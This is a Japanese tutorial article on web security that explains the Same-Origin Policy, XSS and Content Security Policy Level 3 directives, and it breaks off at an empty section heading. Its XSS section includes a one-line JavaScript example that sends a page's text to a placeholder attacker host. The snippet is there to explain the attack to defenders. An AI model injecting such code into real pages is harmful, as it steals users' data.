# はじめに
&emsp;本記事ではCSP(Content Security Policy)について、基礎的な概念やその成り立ちについて、学術的な視点及び実際的な視点の双方から説明します。加えて、CSPの活用方法や、CSPをバイパスするための攻撃のテクニック、今後の展望といったトピックについても説明します。

# Webセキュリティの基礎
&emsp;CSPについて説明する前に、まずはWebセキュリティの基礎について簡単に説明します(特にクライアントサイドのWebセキュリティに焦点を当てます)。

## SOP / Same-Origin Policy
&emsp;Web上では無限大とも言える情報が公開されています。そのような情報の中には、無差別に公開しても良い情報がある一方で、第三者に勝手に読み取られると困る情報もあります。そのため、もしWebページ間において、何らかのアクセス制限のような仕組みがなければ、攻撃者は目的とするデータへのリクエストを発生させるWebページへとターゲットを誘導するだけで、そのデータを取得することができてしまいます。

&emsp;そのような事態を防ぐために、Webページ間のアクセスを制限するための仕組みであるSOP(Same-Origin Policy)が存在します。SOPでは、Originという単位に基づいてアクセスの可否を決定します。ここでOriginとは、以下の3つの値のタプルのことを言います。

- Scheme (e.g. http, https, ftp, etc.)
- Host (e.g. example.com)
- Port (e.g. 80, 443, 20, etc.)

&emsp;あるWebページとあるWebページのOriginが一致している場合はデータの読み込みや書き込みが全面的に許可される一方で、Originが異なる場合はある程度制限されることになります。

&emsp;まとめると、SOPによってリソースの論理的な分離が行われることで、「攻撃者によって任意のWebページのデータが読み取られてしまう」といった事態の発生が防がれています。

## XSS / Cross-Site Scripting
&emsp;前述のSOPをバイパスするためには、攻撃者が目的とする処理を行うようなコンテンツ(i.e. JavaScript)を特定のOrigin上に何とかして挿入する必要があります。そうすることで、SOPによる制約を受けることなく、自由にデータを読み出したり、書き込んだりすることができるからです。

&emsp;例えば、あるWebページに対して任意のJavaScriptの挿入が可能である場合、以下のようなJavaScriptコードを挿入することでそのWebページ全体のデータを得ることができます。

```javascript
window.location.href = `http://[attacker's host]/?dom=${document.body.innerText}`
```

&emsp;このような、あるWebページが任意のJavaScriptの挿入を許してしまっているような場合、そのWebページにはXSS(Cross-Site Scripting)脆弱性が存在するといいます。

## XSSへの対策
&emsp;XSS脆弱性への対策として、主に以下のような手法が存在します。

- 入力値の検査(e.g. 不正な文字が入力値に含まれている場合には拒否する。)
- 出力時のエスケープ

&emsp;もし、これらの対策が完璧に行われているのだとすれば、XSS脆弱性は発生しないでしょう。しかしながら、現実にはXSS脆弱性に起因する攻撃が多数発生しています。

&emsp;その証拠として、資料[1]では、多種多様な業界においてXSS脆弱性の占める割合が非常に高いことが示されています。また、OWASPから「最も重大なウェブアプリケーションリスクトップ10」として発表されるOWASP Top 10[2]においては、2013年度版と2017年度版の双方においてXSS脆弱性がランクインしています。

&emsp;では、どのような対策を行えば良いのでしょうか。

&emsp;ここで、XSS脆弱性の原因について改めて考察してみます。XSS脆弱性が発生する元々の原因は、開発者が認識していないような不正なコンテンツが正当なコンテンツの中に挿入されてしまうことでした。では、ここで以下のように考えることはできないでしょうか。

> 開発者は、どのコンテンツが正当なものであるか、あらかじめある程度は把握できるはずである。であれば、開発者が意図しているコンテンツに限って読み込みや実行が許可されるような仕組みがあれば良いのではないか。

&emsp;このアイディアを実現するものがCSP(Content Security Policy)です。

# CSP (基礎編)
ここから説明する内容やCSPの仕様は、CSP Level 3[3]に準拠します。

## CSPことはじめ
CSPは仕様[3]において、「開発者が、読み込んだり実行したりしても良いリソースを制御することで、XSSのようなContent-Injection脆弱性のリスクを緩和するツールである」と定義されています。

> web developers can control the resources which a particular page can fetch or execute, as well as a number of security-relevant policy decisions.

> Content Security Policy (CSP), a tool which developers can ... mitigating the risk of content injection vulnerabilities such as cross-site scripting, ...

加えて、CSPはそのような脆弱性に対する第一線の防御手法ではなく、あくまで水際対策の一種であり、前述のような入力値の検査や出力時のエスケープの代替策ではないとも述べられています。

> CSP is not intended as a first line of defense against content injection vulnerabilities. Instead, CSP is best used as defense-in-depth. It reduces the harm that a malicious injection can cause, but it is not a replacement for careful input validation and output encoding.

## CSPの目標
CSPの目標は以下の4つであると述べられています.

> 1. リソースやアクションに関する制限を設けることによってContent-Injection攻撃のリスクを緩和する。
> 2. 不正なリソースの埋込みを用いた攻撃のリスクを緩和する。
> 3. アプリケーションの権限を必要最小限にする。
> 4. エクスプロイトされたセキュリティ上の問題となるようなバグを検知し、開発者にレポートする。

この中でも特に重要となるのは、1.の「リソースやアクションに関する制限を設けることによってContent-Injection攻撃のリスクを緩和する。」です。後ほど、これらの目標がどのように達成されるのかを順を追って説明していきます。

# CSP (仕様編)
## CSPの配信方法
CSPの配信方法には以下の2種類があります。

### HTTPレスポンスヘッダー
HTTPレスポンスヘッダーを用いて配信する方法です。

```
HTTP/1.1 200 OK
Host: example.com
...
Content-Security-Policy: <Your CSP Configuration>
...
```

###　<meta>
HTMLヘッダ内の`<meta>`タグで定義する方法です。

```html
<head>
 <meta
    http-equiv="Content-Security-Policy"
    content="<Your CSP Configuration>" >
</head>
```


## Directiveの基礎
CSPはDirectiveの集合によって定義されます。Directiveとは、特定のWebページ上で読み込んだり実行したりしても良いリソースや動作を定義(制限)するための命令の記法のことです。Directiveは、定義対象(name)と定義内容(value)のタプルで構成されます。

```
定義対象1: 定義内容1; // <- Directive
定義対象2: 定義内容2;
...
定義対象k: 定義内容k;
...
```

## Directiveの種別
Directiveは、そのDirectiveが制限(制御)する対象によって、以下の4つに分類されます。

|種別|概要|
|:-:|:-:|
|Fetch Directives|リソースの取得(fetch)に関する制限を行うもの。|
|Document Directives|ドキュメントやWorkerの状態に関する制限を行うもの。|
|Navigation Directives|ナビゲーションに関する制限を行うもの。|
|Reporting Directives|CSPの違反レポートを制御するもの。|

以下では、各Directive種別に含まれるDirectiveについて、代表的なものを取り上げ、それぞれ説明します。

## Fetch Directives
### default-src
Fetch Directivesに含まれるDirectiveのフォールバックとして動作します。つまり、以下の項で示すDirectiveが明示的に指定されていない場合、そのDirectiveに対して`default-src`に指定された値が暗黙的に設定されます。
### child-src
ネストされたコンテンツ(e.g. `<iframe>`)やWorkerとして実行するJavaScriptを制限します。
### connect-src
`XMLHttpRequest`や`fetch`などのscript interfacesを用いてアクセスが可能な接続先URLを制限します。
### frame-src
ネストされたコンテンツ(e.g. `<iframe>`)を制限します。`child-src`よりも細かく制御可能になります。
### img-src
画像リソース(e.g. `<img>`, `favicon`)を制限します。
### media-src
メディアに関するリソース(e.g. `<audio>`, `<video>`)を制限します。
### object-src
プラグインコンテンツ(e.g. `<embed>`, `<object>`, `<applet>`)を制限します。
### script-src
JavaScriptに関する制限を行います。スクリプトブロック(i.e. `<script>`)に関する制限を行う`script-src-elem`や、イベントハンドラ等の属性値に設定されたJavaScriptの制限を行う`script-src-attr`を用いてより細かく制御することも可能です。
### style-src
スタイルシートに関する制限を行います。`<style>`ブロックに関する制限を行う`style-src-elem`や、属性値に設定されたスタイルの制限を行う`style-src-attr`を用いてより細かく制御することも可能です。

## Document Directives
### base-uri
`<base>`で定義する相対URLの起点を制限します。このDirectiveが指定されていない場合、攻撃に活用可能である場合があります。後ほど説明します。
### sandbox
`<iframe>`の`sandbox`属性と同様に、ネストされたコンテンツに対するサンドボックス機能を制御します。

## Navigation Directives
### form-action
`<form>`の`action`属性として指定可能なURLを制限します。
### navigate-to
`<form>`や`window.location`等でナビゲーション可能なURLを制限します。

## Reporting Directives
### report-uri
CSPに指定されたルールへの違反が検知された際に送信する違反レポートの送信先を制御します。

## Directiveに設定する値(script-src)

# 参考資料
[1] HackerOne, HackerOne's 2019 Hacker Powered Security Report, https://www.hackerone.com/sites/default/files/2019-08/hacker-powered-security-report-2019.pdf.

[2] OWASP, OWASP Top 10 - 2017, https://www.owasp.org/images/2/23/OWASP_Top_10-2017%28ja%29.pdf.

[3] W3C, Content Security Policy Level 3 W3C Working Draft, 15 October 2018, https://www.w3.org/TR/CSP3/.
